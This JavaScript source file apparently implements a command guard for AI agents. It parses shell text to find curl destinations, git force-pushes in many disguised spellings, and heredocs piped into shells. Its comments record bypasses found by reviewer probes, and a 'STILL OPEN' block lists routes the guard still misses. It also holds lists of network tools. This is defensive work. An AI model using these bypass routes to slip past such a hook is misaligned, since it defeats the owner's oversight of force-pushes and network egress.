  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
export function shellWords(text) {
  const out = []; let cur = null; let i = 0
  const push = () => { if (cur !== null) out.push(cur); cur = null }
  while (i < text.length) {
    const c = text[i]
    if (/\s/.test(c)) { push(); i++; continue }
    cur ??= ''
    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
      i = j + 1; continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
    cur += c; i++
  }
  push()
  return out
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
export function destHost(value) {
  if (!value) return null
  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  const h = m ? m[1].toLowerCase() : ''
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
export const UNRESOLVED_PREFIX = 'unresolved:'
// Every external destination host in a curl argv (the words AFTER `curl`).
// `covered` (optional) is the set of loop-variable names whose values are judged one by one in the
// loop readings. In the PLAIN reading such a name is still the word `$u`, and failing that closed
// would deny `for u in http://localhost:3420/a ...; do curl "$u"; done` (measured: 1 of 5049
// distinct fleet curl commands). A word that references anything else still fails closed.
export function curlDestinations(args, covered = null) {
  const dests = []
  const isCovered = (v) => covered !== null && !/[$`]/.test(
    v.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (m, a, b) => (covered.has(a ?? b) ? '' : m)))
  // EGRESSPARAMEXP1009: a destination whose host is not a literal AND still carries a `$` is a
  // destination the parser could not read: `url=${u#*|}; curl "$url"` leaves the word `${u#*|}` (the
  // assignment stores the expansion as text, and `expand` only knows `$NAME` / `${NAME}`), and
  // `${u%/x}`, `${u:0:20}`, `${U:-https://x}` are the same. destHost() answers null for them, and a
  // null used to mean "no destination", so the call passed. It now fails closed: the unreadable word
  // itself is the reported host, so the deny message names what could not be resolved.
  const addUrl = (v) => {
    const h = destHost(v)
    if (h) dests.push(h)
    else if (typeof v === 'string' && /[$`]/.test(v) && !isCovered(v)) dests.push(UNRESOLVED_PREFIX + v)
  }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--' ) continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      if (name === 'config') dests.push(UNRESOLVED_PREFIX + `--config ${v ?? ''}`) // a config file can carry `url =`
      else if (CURL_DEST_URL.has(name)) addUrl(v)
      else if (CURL_DEST_PARTS.has(name)) addParts(v)
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (w[q] === 'K') dests.push(UNRESOLVED_PREFIX + `-K ${v ?? ''}`)
        else if (CURL_DEST_URL.has(w[q])) addUrl(v)
        break
      }
      continue
    }
    addUrl(w) // positional: always a URL to curl
  }
  return dests.filter((h) => !isLocalHost(h))
}
// EGRESSHEREDOC924: STDIN FEEDS. A heredoc body or a here-string word is what the command on the
// left reads from stdin. For an interpreter that stdin IS the program (`python3 - <<'PY'`,
// `node <<EOF`, `bash <<< 'curl ...'`), and for a `while read u` loop it is the list of values `u`
// takes. maskInertLiterals blanks both (rightly: to the OUTER shell they are text), so before this
// neither reading was ever judged.
const SHELL = /^(?:bash|sh|zsh|dash|ksh)$/
// `read` options that take a value; -a's value is itself a variable name (an array).
const READ_OPT_WITH_VALUE = new Set('adnNptui'.split(''))
// The word after `<<<`, raw (quotes kept), ending at unquoted whitespace or a shell operator.
function hereStringWord(text, i) {
  while (i < text.length && (text[i] === ' ' || text[i] === '\t')) i++
  const s = i
  while (i < text.length && !/[\s;&|<>()]/.test(text[i])) {
    if (text[i] === "'") { const e = text.indexOf("'", i + 1); i = e === -1 ? text.length : e + 1; continue }
    if (text[i] === '"' || (text[i] === '$' && text[i + 1] === "'")) {
      const q = text[i] === '"' ? '"' : "'"; let j = text[i] === '"' ? i + 1 : i + 2
      while (j < text.length && text[j] !== q) j += text[j] === '\\' ? 2 : 1
      i = j + 1; continue
    }
    i += text[i] === '\\' ? 2 : 1
  }
  return text.slice(s, Math.min(i, text.length))
}
// Every feed: { at, text, expands }. `at` is the operator offset (it decides which sub-command the
// feed belongs to); `expands` is whether the shell expands $VARS in it (unquoted heredoc tag, a
// here-string word that is not single-quoted).
function stdinFeeds(orig, masked, herestrings, env) {
  const feeds = []
  // Heredoc operators are found in the MASKED text, so one inside quotes or another body is not one.
  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
    const tag = m[1] ?? m[2] ?? m[3]
    const nl = orig.indexOf('\n', m.index + m[0].length)
    if (nl === -1) continue
    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
    const rel = endRx.exec(orig.slice(nl + 1))
    const bodyEnd = rel ? nl + 1 + rel.index + rel[0].length : orig.length
    feeds.push({ at: m.index, text: orig.slice(nl + 1, rel ? nl + 1 + rel.index : orig.length), expands: m[3] != null, bodyStart: nl + 1, bodyEnd })
  }
  for (const at of herestrings) {
    const raw = hereStringWord(orig, at + 3)
    if (!raw) continue
    const expands = !raw.startsWith("'")
    feeds.push({ at, text: shellWords(expands ? expand(raw, env) : raw).join(' '), expands: false })
  }
  return feeds
}
// The command word of the sub-command that contains offset `at` (basename, prefixes skipped).
function commandWordAt(masked, at) {
  for (const [a, b] of spans(masked)) {
    if (at < a || at > b) continue
    const mw = words(masked.slice(a, b))
    const i = commandIndex(mw)
    return i < mw.length ? mw[i].split('/').pop() : null
  }
  return null
}
// Every `read` in the command, as { names, array }: `while IFS= read -r a b` -> names [a, b];
// `read -a arr` -> array arr; a bare `read` -> names [REPLY].
function collectReads(orig, masked) {
  const reads = []
  for (const [a, b] of spans(masked)) {
    const sw = shellWords(orig.slice(a, b))
    let k = commandIndex(sw)
    if (sw[k] === 'while' || sw[k] === 'until') k += 1 + commandIndex(sw.slice(k + 1))
    if (sw[k] !== 'read') continue
    const names = []; let array = null
    for (k++; k < sw.length; k++) {
      const w = sw[k]
      if (w.startsWith('-') && w.length > 1) {
        for (let q = 1; q < w.length; q++) {
          if (!READ_OPT_WITH_VALUE.has(w[q])) continue
          const v = q + 1 < w.length ? w.slice(q + 1) : sw[++k]
          if (w[q] === 'a' && /^[A-Za-z_]\w*$/.test(v ?? '')) array = v
          break
        }
        continue
      }
      if (/^[A-Za-z_]\w*$/.test(w)) names.push(w); else break
    }
    reads.push({ names: names.length || array ? names : ['REPLY'], array })
  }
  return reads
}
// The values one `read` gives its variables from a fed text, line by line, the way read splits a
// line: field k to the k-th name, the rest of the line to the last name, every field to an array.
function readValues(text, { names, array }) {
  const out = {}
  const add = (v, x) => { if (x) (out[v] ??= []).push(x) }
  for (const line of text.split('\n')) {
    const f = line.trim().split(/\s+/).filter(Boolean)
    names.forEach((v, k) => add(v, k < names.length - 1 ? f[k] : f.slice(k).join(' ')))
    if (array) for (const x of f) add(array, x)
  }
  return out
}
// GITFORCE1003 (kanban 3b4e46f3, DENYARGS925): a force-push, in EVERY spelling the deny list misses.
// Bash(git push --force:*) matches the command's leading words, so an inserted flag
// (`git push --quiet --force`), an absolute path (`/usr/bin/git push --force`) or `git -C <path> push
// --force` all RAN on a list carrying it (measured 2026-09-25 and again 2026-10-03). A deny pattern
// cannot be made to catch them without denying the whole `git` command, so the command is PARSED:
//   - the command word is found past assignments and prefix commands, on any path (commandIndex);
//   - git's global options are skipped, the ones that take a value consuming it (-C <path>, -c k=v);
//   - the subcommand must be `push`, and then ANY of: --force, -f (also in a cluster such as -fu or
//     -uf), --force-with-lease[=..], --force-if-includes, --mirror (overwrites remote refs, same
//     class), a unique prefix of those long names (git accepts --forc..., --mirr...), or a `+refspec`
//     positional (`git push origin +main`);
//   - `git -c alias.X=...` is refused outright: an alias can name push and its own flags.
//   - `bash -c '...'`, `sh -c`, `eval '...'` are read through: the body is the command line.
// A force-push is not blocked because it is always wrong. It is blocked because the fleet's rule is
// that a force-push needs the owner's say-so first, and a guard that a flag can step around is a label.
// Also read, found by the reviewer's probe (Sam, 2026-10-03): a quoted or backslash-escaped command word
// ("git", \\git), git.exe on any path, a `(git push ...)` subshell, a brace expression in the flag
// (--{force,quiet}), `git -c remote.<n>.push=+ref` on the command line, and `echo "git push -f" | sh`
// (an echo / printf piped into a bare shell).
// STILL OPEN, named so nobody reads "merged" as "closed": an alias or `remote.<name>.push = +ref` set in
// the git CONFIG FILES or through GIT_CONFIG_* environment variables; any command text that reaches a
// shell another way than echo / printf (`cat file | sh`, `sh script.sh`, `eval "$CMD"`, `env -S`);
// an argument builder (xargs, parallel, find -exec) or a script FILE that runs git; a flag that comes
// from an UNRESOLVED variable (`git push $FLAGS`, a value from the environment or a file); a brace
// SEQUENCE ({a..b}) and ANSI-C quoting ($'...') in a flag; a git call made by a language runtime
// (python subprocess, node child_process); `git send-pack`; pushing a deletion (`--delete`, `:ref`),
// which is destructive but not a force-push; and, found by the second probe round (Sam, 2026-10-03):
// an alias defined in the same command (`alias g=git; g push -f`). The command-word substitution
// (`"$(command -v git)" push -f`, `$(echo git) push --force x`, `$GIT push -f`) is now CLOSED for the plain
// shape, fail closed as `git-force-push-indirect` (GITFORCEMAIN1003); a command substitution at the
// command-word position with a git global option before `push` (`$(echo git) -C x push -f`) stays open. A shell FUNCTION defined in the command is read
// (`f(){ git push -f; }`), and so is `git -c remote.<n>.mirror=true`.
const GIT_GLOBAL_WITH_VALUE = new Set(['-C', '--git-dir', '--work-tree', '--namespace', '--super-prefix', '--config-env'])
const PUSH_LONG_WITH_VALUE = new Set(['--repo', '--receive-pack', '--exec', '--push-option'])
const PUSH_FORCE_LONG = ['force', 'force-with-lease', 'force-if-includes', 'mirror']
// Brace expansion of ONE word: `--{force,quiet}` is `--force --quiet` (separate words) to a shell.
// Comma lists only, nested ones included, capped; a sequence ({1..3}) is not expanded.
function expandBraces(word, budget = { n: 32 }) {
  const m = /^([^{]*)\{([^{}]*,[^{}]*)\}(.*)$/s.exec(word)
  if (!m || budget.n <= 0) return [word]
  const out = []
  for (const alt of m[2].split(',')) {
    budget.n--
    out.push(...expandBraces(m[1] + alt + m[3], budget))
  }
  return out
}
export function gitForcePush(rawArgv) {
  // A `(git push ...)` subshell and a quoted/escaped command word reach here as ordinary words
  // (shellWords has already removed the quotes and backslashes); the opening paren / brace is not.
  const argv = rawArgv
    .map((w, k) => (k === 0 ? w.replace(/^[({]+(?=.)/, '') : w))
    .flatMap((w) => expandBraces(w))
  // A function DEFINITION (`f(){ git push -f; }`, `function f { ... }`): its body is a command line, read
  // statically whether or not the function is ever called.
  if (/^[A-Za-z_][\w-]*\(\)\{?$/.test(argv[0] ?? '')) argv.shift()
  else if (argv[0] === 'function') argv.splice(0, 2)
  let i = commandIndex(argv)
  if (i >= argv.length) return null
  // OPAQUE command word (GITFORCEMAIN1003): the command word is a substitution or an unresolved variable
  // standing where `git` should be. liftSubstitutions blanks a `$(...)` to spaces, so `$(echo git) push -f r`
  // reaches here as `push -f r`, and `"$(command -v git)" push -f r` as a blank word followed by `push`;
  // `$GIT push -f r` keeps its variable. None of these is the word `git`, but `push` standing at the command
  // position, or right behind an opaque word, with a force flag is a force-push of something: fail closed.
  // The cost is a command literally named `push`, or `$X push -f`, that is not git; none was in 9286
  // distinct commands of the main agent's history.
  const word = argv[i].split('/').pop().replace(/\.exe$/i, '')
  const opaque = (w) => w.trim() === '' || /^["']?[$`]/.test(w)
  if (word === 'push') return pushForce(argv, i) ? 'git-force-push-indirect' : null
  if (opaque(argv[i]) && argv[i + 1] === 'push') return pushForce(argv, i + 1) ? 'git-force-push-indirect' : null
  if (word !== 'git') return null
  for (i++; i < argv.length; i++) {
    const w = argv[i]
    if (!w.startsWith('-')) break
    if (w === '-c' || (w.startsWith('-c') && !w.startsWith('--'))) {
      const v = w === '-c' ? (argv[i + 1] ?? '') : w.slice(2)
      if (/^alias\./i.test(v)) return 'git-alias-override'
      if (/^remote\.[^=]*\.push=.*\+/i.test(v)) return 'git-force-push'
      if (/^remote\.[^=]*\.mirror=(?:true|yes|on|1)$/i.test(v)) return 'git-force-push'
      if (w === '-c') i++
      continue
    }
    if (GIT_GLOBAL_WITH_VALUE.has(w)) i++
  }
  if (argv[i] !== 'push') return null
  return pushForce(argv, i) ? 'git-force-push' : null
}
// The force flags of a `push` whose word sits at argv[at]: true when ANY of them is a force spelling.
function pushForce(argv, at) {
  let rest = false
  for (let i = at + 1; i < argv.length; i++) {
    const w = argv[i]
    if (!rest && w === '--') { rest = true; continue }
    if (!rest && w.startsWith('--')) {
      const name = w.split('=')[0]
      const opt = name.slice(2)
      if (opt && PUSH_FORCE_LONG.some((l) => l.startsWith(opt))) return true
      if (PUSH_LONG_WITH_VALUE.has(name) && !w.includes('=')) i++
      continue
    }
    if (!rest && w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (w[q] === 'f') return true
        if (w[q] === 'o') { if (q === w.length - 1) i++; break }
      }
      continue
    }
    if (w.startsWith('+')) return true
  }
  return false
}
// `echo "git push --force r" | sh`: the text of an echo / printf piped into a BARE shell (no -c, no
// script) is that shell's command line. `prev` is { argv } of the span piped into this one, or null.
function pipedShellBody(prev, argv) {
  if (!prev) return null
  const k = commandIndex(argv)
  if (k >= argv.length || !SHELL.test(argv[k].split('/').pop())) return null
  if (argv.slice(k + 1).some((w) => !w.startsWith('-') || /c/.test(w.replace(/^-+/, '')))) return null
  const pk = commandIndex(prev.argv)
  const pc = (prev.argv[pk] ?? '').split('/').pop()
  if (pc !== 'echo' && pc !== 'printf') return null
  return prev.argv.slice(pk + 1).filter((w) => !/^-[neE]+$/.test(w)).join(' ')
}
// The body of `sh -c BODY`, or of `eval BODY...`: a command line of its own, judged for git only.
function shellBody(argv) {
  const k = commandIndex(argv)
  if (k >= argv.length) return null
  const cmd = argv[k].split('/').pop()
  if (cmd === 'eval') return argv.slice(k + 1).join(' ')
  if (BYPASS_RUNNERS.has(cmd)) {
    for (let j = k + 1; j < argv.length; j++) {
      if (argv[j] === '-c' || argv[j] === '--call') return argv[j + 1] ?? null
      if (argv[j].startsWith('--call=')) return argv[j].slice('--call='.length)
    }
    return null
  }
  if (!SHELL.test(cmd)) return null
  for (let j = k + 1; j < argv.length; j++) {
    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(argv[j])) return argv[j + 1] ?? null
    if (!argv[j].startsWith('-')) return null
  }
  return null
}
// gitOnly (GITFORCEMAIN1003): judge ONLY the git force-push family and skip every egress shape. The main
// agent wires the hook with `--git-only`: its own work legitimately reaches api.github.com, api.marveen.io,
// api.open-meteo.com and api.telegram.org from python heredocs (measured: 120 of 9286 distinct commands in
// its history), and widening store/egress-vendor-hosts.json is an owner decision (it says api.github.com is
// deliberately NOT listed). The force-push guard does not have that cost. The flag is threaded through every
// recursive call, so `curl https://x; git push -f` is still judged for the push, not stopped at the curl.
const isGitReason = (reason) => /(?:^|-)git-/.test(String(reason ?? ''))
// `inherit` is what the enclosing command already bound (its NAME=value assignments and `for` loops):
// a $( ... ) / backtick body is a command of its own, but it runs in that shell, so `U=...; r=$(curl "$U")`
// reads U from the outside. Without it the inner `curl "$U"` has an unresolved destination, which is
// now a deny (EGRESSPARAMEXP1009) -- right for a variable nobody set, wrong for this one -- and before
// the deny it was a silent pass for an external U as well.
const NO_BINDINGS = { env: {}, loops: {} }
const OPAQUE_WORD = /^["']?[$`]/
function withSubstitutionMarks(orig, regions, a, b) {
  let out = ''; let k = a
  for (const [s, e] of regions) {
    if (e <= a || s >= b) continue
    out += orig.slice(k, s) + '$(subst)'; k = e
  }
  return out + orig.slice(k, b)
}
function mergeLoops(a, b) {
  const out = { ...a }
  for (const [k, v] of Object.entries(b)) out[k] = [...(out[k] ?? []), ...v]
  return out
}
// Where a data-looking heredoc's text actually GOES (Sam 3528, HEX 3530). `cat <<'EOF' | bash` reads the
// heredoc with `cat`, but the text is the program of the `bash` one pipe further; `source /dev/stdin <<EOF`
// and `tee <<EOF >(bash)` run it too. Deciding code versus data by the command word that READS the heredoc
// alone let all of these through. Returns the command word of the shell / interpreter that runs the text,
// or null when the text is only data. The pipe is followed through plain text filters only (a `curl
// --data-binary @-` in between hands its own RESPONSE on, not the heredoc), and a shell or interpreter
// counts as fed from stdin only when it has no program of its own (no -c, no script operand): the same
// rule pipedShellBody applies to `echo ... | bash`.
// Commands that do NOT hand their stdin on as text: they count it, hash it, compare it, ship it somewhere or
// answer with something else. The pipe is followed through every OTHER stage (HEX 3546: a filter list is a
// closed set, a pass-through default is not: `| tac | tac | bash`, `| iconv ... | bash`, `| perl -pe ... | bash`
// all carry the heredoc's text to the shell). Code run INSIDE a filter (`awk '{system($0)}'`, `sed e`,
// `while read l; do eval "$l"; done`) is a named limit: there is no shell at the end of the pipe to judge.
const PIPE_STOPPERS = new Set(['wc', 'md5sum', 'sha1sum', 'sha224sum', 'sha256sum', 'sha384sum', 'sha512sum', 'b2sum', 'cksum', 'sum',
  'cmp', 'diff', 'comm', 'curl', 'wget', 'nc', 'ncat', 'socat', 'ssh', 'scp', 'sftp', 'rsync', 'mail', 'sendmail', 'mutt',
  'true', 'false', 'test', 'read', 'wait', 'sleep'])
const STDIN_PATH = /^\/(?:dev\/(?:stdin|fd\/0)|proc\/self\/fd\/0)$/
// Option letters that take a VALUE (the next word, or the rest of the cluster), per interpreter family.
const SHELL_VALUE_LETTERS = new Set(['o', 'O'])
const SHELL_VALUE_LONG = new Set(['--rcfile', '--init-file'])
const PY_VALUE_LETTERS = new Set(['W', 'X', 'Q', 'K'])
const NODE_VALUE_FLAGS = new Set(['-r', '--require', '--import', '--loader', '--experimental-loader', '-C', '--conditions', '--input-type', '--title'])
const NODE_OWN_PROGRAM = new Set(['-e', '--eval', '-p', '--print', '-pe', '-c', '--check'])
const OTHER_OWN_PROGRAM = new Set(['-e', '-E', '-r', '-c', '-Command', '-command', '-File', '-file', '-EncodedCommand', '-encodedcommand', '-f'])
// Does this stage read its PROGRAM from stdin? Returns the command word when it does (no program of its own:
// no -c / -m / -e, no script file), null otherwise. After `-s` or `-` every word is a positional ARGUMENT.
// Options with their own value (`-o pipefail`, `-W ignore`, `--rcfile f`) do not make a program of the value.
function stdinFedProgram(argvIn) {
  const argv = argvIn.filter((w) => w !== '&' && !/^\d*[<>&]/.test(w))
  const k = commandIndex(argv)
  if (k >= argv.length) return null
  const word = argv[k].split('/').pop()
  const lower = word.toLowerCase()
  const isShell = SHELL.test(word)
  const isPy = PYTHON.test(lower)
  const isNode = /^(?:node(?:js)?|deno|bun)$/.test(lower)
  const isOther = INTERPRETER.test(lower) && !isPy && !isNode
  if (!isShell && !isPy && !isNode && !isOther) return null
  for (let i = k + 1; i < argv.length; i++) {
    const w = argv[i]
    if (w === '--') return i + 1 < argv.length ? null : word          // `-- script` is a script, `--` alone is stdin
    if (w === '-') return word                                         // stdin; the rest are arguments
    if (isShell) {
      if (/^[-+][A-Za-z]+$/.test(w)) {
        const letters = w.slice(1)
        if (w[0] === '-' && letters.includes('c')) return null         // -c 'string' is a program of its own
        if (w[0] === '-' && letters.includes('s')) return word         // -s: stdin; positionals follow
        if ([...letters].some((l) => SHELL_VALUE_LETTERS.has(l))) i++  // -o NAME / -O NAME / +o NAME
        continue
      }
      if (SHELL_VALUE_LONG.has(w)) { i++; continue }
      if (w.startsWith('--')) continue                                 // --norc, --login, --posix, --rcfile=f ...
      return null                                                      // first plain word: a script file
    }
    if (isPy) {
      if (/^-[A-Za-z]+$/.test(w)) {
        const letters = w.slice(1)
        for (let j = 0; j < letters.length; j++) {
          const l = letters[j]
          if (l === 'c' || l === 'm') return null                      // -c code / -m module: a program of its own
          if (PY_VALUE_LETTERS.has(l)) { if (j === letters.length - 1) i++; break }  // -W ignore / -Wignore
        }
        continue
      }
      if (w === '--check-hash-based-pycs') { i++; continue }
      if (w.startsWith('--')) continue
      return null                                                      // script file
    }
    if (isNode) {
      if (NODE_OWN_PROGRAM.has(w)) return null
      if (NODE_VALUE_FLAGS.has(w)) { i++; continue }
      if (w.startsWith('-')) continue                                  // --stack-size=2000, --no-warnings ...
      return null                                                      // script file (or a deno/bun subcommand)
    }
    if (OTHER_OWN_PROGRAM.has(w)) return null
    if (w.startsWith('-')) continue
    return null
  }
  return word
}
// The command word of a stage that does not pass its stdin on as text; null for everything else.
function stageStopsPipe(argv) {
  const k = commandIndex(argv)
  if (k >= argv.length) return false
  const word = argv[k].split('/').pop()
  if (PIPE_STOPPERS.has(word)) return true
  // grep that answers with a count / a verdict / file names, not with lines
  if (/^(?:e|f)?grep$/.test(word) && argv.slice(k + 1).some((x) => /^-[A-Za-z]*[cqlLs]/.test(x))) return true
  // (a shell or interpreter with a program of its own is NOT a stopper: `perl -pe`, `python3 -c '...write(read())'`
  // are exactly the filters that hand the text on, and the parser cannot tell them from one that does not)
  return false
}
// The command word of the shell that a process substitution `>( ... )` runs, if it is one fed from stdin.
function processSubstitutionSink(spanText) {
  for (const m of spanText.matchAll(/>\(([^()]*)\)/g)) {
    const prog = stdinFedProgram(shellWords(m[1]))
    if (prog) return prog
  }
  return null
}
// `xargs [options] COMMAND ...`: with a shell and -c each INPUT LINE becomes that shell's program
// (`xargs -I{} bash -c {}`). The shell has to be the command xargs runs, not a word that merely appears.
const XARGS_VALUE_OPTS = new Set(['-I', '-i', '-n', '-P', '-d', '-L', '-l', '-s', '-E', '-e', '-a', '-0x'])
function xargsShellSink(argv) {
  const k = commandIndex(argv)
  if (k >= argv.length || argv[k].split('/').pop() !== 'xargs') return null
  let i = k + 1
  for (; i < argv.length; i++) {
    const w = argv[i]
    if (w === '--') { i++; break }
    if (!w.startsWith('-') || w === '-') break
    if (XARGS_VALUE_OPTS.has(w)) i++
  }
  const rest = argv.slice(i)
  const c = commandIndex(rest)
  if (c >= rest.length) return null
  const word = rest[c].split('/').pop()
  if (!SHELL.test(word)) return null
  return rest.slice(c + 1).some((x) => /^-[A-Za-z]*c[A-Za-z]*$/.test(x)) ? word : null
}
// Where a data-looking heredoc's text actually GOES (Sam 3528 / 3544, HEX 3530 / 3546). `cat <<'EOF' | bash`
// reads the heredoc with `cat`, but the text is the program of the `bash` one pipe further; `source /dev/stdin
// <<EOF`, `tee <<EOF >(bash)` and `(cat <<EOF) | bash` run it too. Deciding code versus data by the command
// word that READS the heredoc alone let all of these through. Returns the command word of the shell or
// interpreter that runs the text, or null when it is only data.
// The command text that holds offset `at`, split at its unquoted top-level separators (`|`, `|&`, `||`, `&&`,
// `;`, `&`, newline), quote-, parenthesis- and brace-group-aware. The masked text cannot do this job: the body
// of an interpreter's `-c '...'` is deliberately NOT masked (it is judged), so a `;` inside it split the line
// there. The heredoc BODIES are cut out first (Sam 3555): a group's closing `) | bash` / `} | bash` sits on a
// line AFTER a heredoc's terminator, and the body text must not be read as shell. Returns the stages, the
// index of the one that holds the offset, and the offset relative to the cut text.
function splitCommandLine(orig, at, bodies = []) {
  let text = ''
  let pos = 0
  let rel = at
  for (const b of [...bodies].sort((x, y) => x.bodyStart - y.bodyStart)) {
    if (b.bodyStart < pos) continue
    text += orig.slice(pos, b.bodyStart)
    if (b.bodyStart <= at) rel -= b.bodyEnd - b.bodyStart
    pos = b.bodyEnd
  }
  text += orig.slice(pos)
  const stages = []
  let cur = ''
  let curStart = 0
  let q = null
  let depth = 0
  let cmdPos = true   // is the next word at a command position (start, or after a separator / opener)?
  for (let i = 0; i < text.length; i++) {
    const c = text[i]
    if (q) {
      cur += c
      if (c === '\\' && q === '"' && i + 1 < text.length) { cur += text[++i]; continue }
      if (c === q) q = null
      continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += c + text[++i]; cmdPos = false; continue }
    if (c === "'" || c === '"') { q = c; cur += c; cmdPos = false; continue }
    if (c === '(') { depth++; cur += c; cmdPos = true; continue }
    if (c === ')') { depth = Math.max(0, depth - 1); cur += c; cmdPos = false; continue }
    // a brace group `{ ...; }`: `{` and `}` count only as WORDS at a command position, so `${x}`, `{a,b}` and
    // `xargs -I {}` are not groups (a stray count would swallow every later separator)
    if (c === '{' && cmdPos && /\s/.test(text[i + 1] ?? '')) { depth++; cur += c; continue }
    if (c === '}' && cmdPos && depth > 0 && (i + 1 >= text.length || /[\s;|&)]/.test(text[i + 1]))) { depth--; cur += c; cmdPos = false; continue }
    if (c === '\n') {
      if (depth > 0) { cur += c; cmdPos = true; continue }
      if (cur.trim() !== '') { stages.push({ text: cur, sep: ';', start: curStart }); cur = ''; curStart = i + 1 }
      cmdPos = true
      continue
    }
    if (depth === 0 && (c === '|' || c === '&' || c === ';')) {
      let sep = c
      if (c === '|' && text[i + 1] === '|') { sep = '||'; i++ }
      else if (c === '|' && text[i + 1] === '&') { sep = '|'; i++ }
      else if (c === '&' && text[i + 1] === '&') { sep = '&&'; i++ }
      else if (c === '&' && (text[i - 1] === '>' || text[i - 1] === '<' || text[i + 1] === '>')) { cur += c; continue }  // 2>&1, &>
      stages.push({ text: cur, sep, start: curStart })
      cur = ''
      curStart = i + 1
      cmdPos = true
      continue
    }
    if (c === ';' || c === '|' || c === '&') { cur += c; cmdPos = true; continue }  // inside a group
    cur += c
    if (!/\s/.test(c)) cmdPos = false
  }
  stages.push({ text: cur, sep: '', start: curStart })
  // the stage that holds the heredoc operator: the last one that starts at or before the offset
  let idx = 0
  for (let n = 0; n < stages.length; n++) if (stages[n].start <= rel) idx = n
  return { stages, idx, rel }
}
// The simple command that holds the offset, with every nesting level on the way down: a stage that is a group
// (`( ... )`, `{ ...; }`) is opened and split again, so `{ echo x; source /dev/stdin <<EOF; }` is judged by the
// `source`, not by the `echo` in front of it, and `(cat <<EOF | bash)` is followed inside the group.
function descend(first) {
  const levels = [first]
  let stage = first.stages[first.idx]
  let rel = first.rel - stage.start
  for (let guard = 0; guard < 8; guard++) {
    const open = /^\s*(?:\(|\{(?=\s))\s*/.exec(stage.text)
    if (!open) break
    const inner = splitCommandLine(stage.text.slice(open[0].length), rel - open[0].length)
    levels.push(inner)
    stage = inner.stages[inner.idx]
    rel = inner.rel - stage.start
  }
  return { holder: stage.text, levels }
}
function codeSinkOf(orig, masked, at, bodies = []) {
  const { holder, levels } = descend(splitCommandLine(orig, at, bodies))
  const words = (text) => shellWords(text).filter((w) => w !== '&' && w !== '(' && w !== ')' && w !== '{' && w !== '}')
    .map((w) => w.replace(/^\(+/, '').replace(/\)+$/, '')).filter((w) => w !== '')
  const own = words(holder)
  const k = commandIndex(own)
  const word = k < own.length ? own[k].split('/').pop() : ''
  // `source /dev/stdin <<EOF`, `. /dev/stdin <<EOF`
  if ((word === 'source' || word === '.') && STDIN_PATH.test(own[k + 1] ?? '')) return 'bash'
  // `tee <<EOF >(bash)`, `>(exec bash -s)`, `>(timeout 5 bash)`
  const ps = processSubstitutionSink(holder)
  if (ps) return ps
  // the pipeline to the right of the command that holds the heredoc, at its own level first and then at every
